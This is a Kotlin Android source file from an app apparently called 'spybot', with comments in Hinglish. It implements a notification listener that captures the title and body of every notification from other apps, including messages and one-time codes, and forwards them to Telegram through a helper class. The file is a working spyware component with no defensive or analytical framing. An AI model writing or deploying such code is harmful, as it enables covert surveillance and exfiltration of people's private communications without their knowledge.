package com.example.spybot

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.example.spybot.helper.TelegramHelper

class NotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val packageName = sbn.packageName ?: return

        // Apni hi app ko ignore karein
        if (packageName == this.packageName) return

        val extras = sbn.notification?.extras ?: return

        // CharSequence se safely text nikaalein
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: "No Title"
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim() ?: text

        // Title aur text dono khali hain to drop karein
        if (title.isEmpty() && text.isEmpty() && bigText.isEmpty()) {
            return
        }

        val appName = getAppName(packageName) ?: packageName
        val finalBody = if (bigText.isNotEmpty() && bigText != text) bigText else text

        Log.d("NOTIFICATION_LOG", "Captured from $appName: $title - $finalBody")

        // Telegram par bhejein
        TelegramHelper.sendNotification(this, title, finalBody, appName)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional
    }

    private fun getAppName(packageName: String): String? {
        return try {
            packageManager.getApplicationLabel(
                packageManager.getApplicationInfo(packageName, 0)
            ).toString()
        } catch (e: Exception) {
            null
        }
    }
}
